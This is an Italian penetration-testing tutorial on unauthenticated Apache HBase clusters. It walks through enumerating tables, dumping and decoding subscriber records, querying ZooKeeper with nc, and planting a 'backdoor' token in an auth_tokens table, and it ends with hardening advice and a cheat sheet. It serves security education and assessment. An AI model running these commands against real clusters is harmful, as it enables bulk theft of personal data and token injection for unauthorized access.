---
title: 'Porta 16010 HBase: Dump Miliardi di Record Senza Autenticazione'
slug: porta-16010-hbase
description: 'HBase Master UI sulla 16010 senza auth: enumera tabelle, dumpa dati via REST API e Thrift, leggi token e CDR. Pentest completo con scan, lateral movement Hadoop.'
image: /porta-16010-hbase.webp
draft: true
date: 2026-04-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - hadoop
  - hbase
  - big-data
---

Apache HBase è il database NoSQL colonnare del mondo Hadoop: gestisce miliardi di righe distribuite su centinaia di nodi, usato da aziende che lavorano con volumi di dati enormi — telco per i CDR (Call Detail Records), banche per lo storico delle transazioni, adtech per i profili comportamentali, IoT per la telemetria dei sensori. La porta 16010 TCP è la **Master Web UI** — il pannello di controllo che mostra lo stato del cluster, le tabelle, i RegionServer, le operazioni in corso. Ma HBase non è solo la 16010: espone anche la **REST API** (porta 8080 o 17010) e la **Thrift API** (porta 9090 o 17020) che permettono di leggere e scrivere dati programmaticamente. E nel design originale di HBase — pensato per girare in un cluster Hadoop protetto dal perimetro di rete — **nessuna di queste interfacce ha autenticazione di default**.

Se sei abituato a testare [MySQL](https://hackita.it/articoli/porta-3306-mysql) o [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql) dove almeno serve una password, HBase ti sorprenderà: ti connetti e leggi miliardi di righe senza che nessuno ti chieda chi sei.

Durante un assessment per una grande telco, ho trovato la 16010 esposta sulla rete interna. La Master UI mostrava 47 tabelle con nomi come `cdr_raw`, `subscriber_profile`, `billing_events`. Con la REST API ho scaricato 500 record dalla tabella dei profili subscriber: nome, cognome, numero di telefono, piano tariffario, IMEI del dispositivo. Il CISO non sapeva nemmeno che HBase avesse un'interfaccia web.

## Cos'è HBase — Per Chi Non Lavora con Big Data

HBase è un database distribuito modellato su Google Bigtable. A differenza dei database relazionali, organizza i dati in **tabelle con famiglie di colonne** — ogni riga ha una chiave (row key) e può avere milioni di colonne. I dati sono distribuiti su **RegionServer** (i worker che contengono le partizioni dei dati) e coordinati da un **Master** (il controller che gestisce il cluster). Gira tipicamente sopra HDFS ([Hadoop](https://hackita.it/articoli/hadoop-hdfs)) per lo storage distribuito.

```
Client                     HBase Cluster
┌──────────────┐          ┌──────────────────────────────────┐
│ Browser      │─:16010──►│ HBase Master Web UI              │
│              │          │   (stato cluster, tabelle)       │
│ REST client  │─:8080───►│ REST Gateway (Stargate)          │
│              │          │   (read/write via HTTP)          │
│ Thrift client│─:9090───►│ Thrift Gateway                   │
│              │          │   (read/write via Thrift)        │
│ HBase shell  │─:16000──►│ Master RPC (ZooKeeper coord)     │
│              │          │                                  │
│              │          │ RegionServer 1 (:16020/:16030)   │
│              │          │ RegionServer 2 (:16020/:16030)   │
│              │          │ RegionServer N (:16020/:16030)   │
└──────────────┘          └──────────────────────────────────┘
```

| Porta          | Servizio                                                      | Funzione                               |
| -------------- | ------------------------------------------------------------- | -------------------------------------- |
| **16010**      | Master Web UI                                                 | Dashboard stato cluster                |
| 16000          | Master RPC                                                    | Comunicazione programmatica col Master |
| 16020          | RegionServer RPC                                              | Accesso dati                           |
| 16030          | RegionServer Web UI                                           | Dashboard singolo RegionServer         |
| 8080 (o 17010) | REST API (Stargate)                                           | Lettura/scrittura via HTTP             |
| 9090 (o 17020) | Thrift API                                                    | Lettura/scrittura via Thrift           |
| 2181           | [ZooKeeper](https://hackita.it/articoli/porta-2181-zookeeper) | Coordinamento cluster                  |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 16010,16000,16020,16030,8080,9090,2181 10.10.10.40
```

### Master Web UI

```bash
curl -s http://10.10.10.40:16010/master-status | head -100
```

La Master UI è una pagina HTML con lo stato completo del cluster. Se risponde senza chiedere credenziali → accesso totale.

```bash
# Apri nel browser
# http://10.10.10.40:16010/master-status
```

**Intelligence dalla UI:**

* **Versione HBase** — per CVE
* **Lista tabelle** — nomi, dimensioni, numero di regioni
* **RegionServer** — hostname e IP di tutti i nodi del cluster
* **Stato del cluster** — operazioni in corso, compaction, snapshot

### Tabelle disponibili

```bash
# Dalla Master UI (sezione "User Tables")
curl -s http://10.10.10.40:16010/master-status | grep -oP 'table\.jsp\?name=\K[^"]+' | sort -u
```

```
cdr_raw
subscriber_profile
billing_events
network_events
device_inventory
session_logs
auth_tokens
```

Sette tabelle — CDR, profili utenti, fatturazione, token di autenticazione. Dati telco di alto valore.

## 2. REST API (Stargate) — Lettura e Scrittura Dati

La REST API è il modo più diretto per interagire con HBase via HTTP. Se la porta 8080 (o 17010) è aperta:

### Verifica accesso

```bash
curl -s http://10.10.10.40:8080/version/cluster
```

```json
"2.5.8"
```

### Lista tabelle

```bash
curl -s http://10.10.10.40:8080/ -H "Accept: application/json"
```

```json
{"table":[{"name":"cdr_raw"},{"name":"subscriber_profile"},{"name":"billing_events"},{"name":"auth_tokens"}]}
```

### Schema di una tabella

```bash
curl -s http://10.10.10.40:8080/subscriber_profile/schema -H "Accept: application/json"
```

```json
{
    "name": "subscriber_profile",
    "ColumnSchema": [
        {"name": "personal", "VERSIONS": "3"},
        {"name": "plan", "VERSIONS": "1"},
        {"name": "device", "VERSIONS": "1"}
    ]
}
```

Tre famiglie di colonne: dati personali, piano tariffario, dispositivo.

### Scan — Leggere i dati

```bash
# Scansiona le prime 10 righe
curl -s "http://10.10.10.40:8080/subscriber_profile/scanner" \
  -H "Accept: application/json" \
  -H "Content-Type: text/xml" \
  -d '<Scanner batch="10"/>' -v 2>&1 | grep "Location:"
# Restituisce un URL scanner da cui leggere

# Leggi una riga specifica per row key
curl -s "http://10.10.10.40:8080/subscriber_profile/row_key_123" \
  -H "Accept: application/json"
```

```json
{
    "Row": [{
        "key": "cm93XzEyMw==",
        "Cell": [
            {"column": "cGVyc29uYWw6bmFtZQ==", "$": "TWFyaW8gUm9zc2k="},
            {"column": "cGVyc29uYWw6cGhvbmU=", "$": "KzM5MzMzMTIzNDU2Nw=="},
            {"column": "cGxhbjp0eXBl", "$": "cHJlbWl1bQ=="},
            {"column": "ZGV2aWNlOmltZWk=", "$": "MzU0ODQwMDg4MTIzNDU2"}
        ]
    }]
}
```

I valori sono in base64. Decodifica:

```bash
echo "TWFyaW8gUm9zc2k=" | base64 -d    # Mario Rossi
echo "KzM5MzMzMTIzNDU2Nw==" | base64 -d  # +393331234567
echo "cHJlbWl1bQ==" | base64 -d           # premium
echo "MzU0ODQwMDg4MTIzNDU2" | base64 -d   # 354840088123456 (IMEI)
```

Nome, telefono, piano tariffario e IMEI del dispositivo.

### Scan massivo con scanner API

```bash
# Crea uno scanner (restituisce un URL)
SCANNER=$(curl -s -X PUT "http://10.10.10.40:8080/subscriber_profile/scanner" \
  -H "Content-Type: text/xml" \
  -d '<Scanner batch="100"/>' -D - 2>/dev/null | grep "Location:" | awk '{print $2}' | tr -d '\r')

# Leggi batch di 100 righe alla volta
curl -s "$SCANNER" -H "Accept: application/json"
# Ripeti finché non restituisce 204 No Content
```

### Scrivere dati (se hai accesso write)

```bash
# Inserisci un record
curl -s -X PUT "http://10.10.10.40:8080/auth_tokens/backdoor_row" \
  -H "Content-Type: application/json" \
  -d '{"Row":[{"key":"YmFja2Rvb3I=","Cell":[{"column":"ZGF0YTp0b2tlbg==","$":"YXR0YWNrZXJfdG9rZW4="}]}]}'
```

Se l'applicazione legge `auth_tokens` → hai iniettato un token valido.

## 3. HBase Shell (porta 16000)

Se puoi raggiungere la porta 16000 (Master RPC) e hai `hbase` client installato:

```bash
hbase shell
```

```ruby
# Lista tabelle
list

# Scan una tabella (prime 10 righe)
scan 'subscriber_profile', {LIMIT => 10}

# Conta le righe
count 'subscriber_profile'

# Leggi una riga specifica
get 'subscriber_profile', 'row_key_123'

# Scan con filtro
scan 'auth_tokens', {FILTER => "ValueFilter(=, 'substring:admin')"}
```

## 4. ZooKeeper — Il Coordinatore

HBase dipende da [ZooKeeper](https://hackita.it/articoli/porta-2181-zookeeper) (porta 2181) per la coordinazione. Se ZooKeeper è accessibile:

```bash
echo "dump" | nc 10.10.10.40 2181
```

Rivela: tutti i nodi HBase registrati, il master attivo, i RegionServer, la configurazione del cluster.

```bash
# Leggi la configurazione HBase da ZooKeeper
echo "get /hbase/master" | nc 10.10.10.40 2181
```

## 5. Autenticazione — Kerberos (Quando C'è)

HBase supporta Kerberos per l'autenticazione, ma richiede un KDC configurato, keytab per ogni servizio e `hbase.security.authentication=kerberos` nel config. Nella pratica: gli ambienti che non hanno Kerberos configurato per l'intero cluster Hadoop non lo hanno nemmeno per HBase. E configurare Kerberos per Hadoop è un incubo operativo che molte aziende evitano — soprattutto in ambienti on-premise non enterprise.

Verifica:

```bash
# Se la REST API risponde senza auth → Kerberos non è configurato
curl -s http://10.10.10.40:8080/ -H "Accept: application/json"
# Se risponde 401 con "Negotiate" → Kerberos attivo
```

## 6. Lateral Movement dal Cluster HBase

Con accesso ai dati HBase:

* **Credenziali** dalla tabella `auth_tokens` → accesso all'applicazione
* **Session token** → [session hijacking](https://hackita.it/articoli/porta-11211-memcached)
* **RegionServer hostname/IP** dalla Master UI → scansione nuovi target
* **ZooKeeper** → mappa completa del cluster [Hadoop](https://hackita.it/articoli/hadoop-hdfs)/[Kafka](https://hackita.it/articoli/porta-9092-kafka)
* **HDFS** — HBase salva i dati su HDFS → se trovi il NameNode puoi accedere a tutto il filesystem distribuito

## 7. Detection & Hardening

* **Kerberos** — l'unico vero meccanismo di autenticazione per HBase
* **Non esporre 16010/8080/9090** al di fuori del cluster
* **Firewall** — porte HBase accessibili solo dai nodi applicativi autorizzati
* **ACL** — HBase supporta access control list per tabella e colonna (richiede Kerberos)
* **TLS** tra nodi e per le API
* **Disabilita REST/Thrift** se non necessari
* **Audit log** — abilita per tracciare accessi e scan

## 8. Mini FAQ

**HBase ha una password di default?**
No — HBase non ha proprio un concetto di password. L'autenticazione è delegata a Kerberos. Senza Kerberos configurato, chiunque raggiunge le porte del cluster ha accesso completo a tutti i dati. Non è un bug — è il design originale per ambienti di rete fidati.

**Posso fare injection su HBase come su [MongoDB](https://hackita.it/articoli/porta-27017-mongodb)?**
No nel senso classico: HBase non ha un linguaggio di query come SQL o MQL. L'accesso è tramite API (get/put/scan con row key e filtri). Ma se l'applicazione costruisce le richieste HBase concatenando input utente senza validazione, puoi manipolare il row key range per accedere a dati non autorizzati — un tipo di "parameter tampering" specifico per database key-value.

**Quanti dati posso estrarre da HBase?**
Potenzialmente miliardi di righe. La REST API con scanner non ha limiti di default — fai batch di 100/1000 righe e continui finché ci sono dati. Lo scan completo di una tabella grande può richiedere ore e generare traffico significativo — in un pentest reale, limita il campione e documenta il rischio.

## 9. Cheat Sheet Finale

| Azione        | Comando                                                                                                |
| ------------- | ------------------------------------------------------------------------------------------------------ |
| Nmap          | `nmap -sV -p 16010,16000,8080,9090,2181 target`                                                        |
| Master UI     | `http://target:16010/master-status`                                                                    |
| REST version  | `curl http://target:8080/version/cluster`                                                              |
| Lista tabelle | `curl http://target:8080/ -H "Accept: application/json"`                                               |
| Schema        | `curl http://target:8080/TABLE/schema -H "Accept: application/json"`                                   |
| Leggi riga    | `curl http://target:8080/TABLE/ROW_KEY -H "Accept: application/json"`                                  |
| Crea scanner  | `curl -X PUT http://target:8080/TABLE/scanner -H "Content-Type: text/xml" -d '<Scanner batch="100"/>'` |
| HBase shell   | `hbase shell` → `list` → `scan 'TABLE', {LIMIT => 10}`                                                 |
| ZooKeeper     | `echo "dump" \| nc target 2181`                                                                        |

***

Riferimento: Apache HBase Reference Guide, HBase REST API, HackTricks Hadoop/HBase. Uso esclusivo in ambienti autorizzati.

> Il tuo cluster HBase è raggiungibile dalla rete aziendale senza autenticazione? [Verifica con un assessment HackIta](https://hackita.it/servizi) prima che miliardi di record finiscano nelle mani sbagliate. Per imparare il pentesting Big Data: [formazione 1:1](https://hackita.it/formazione).
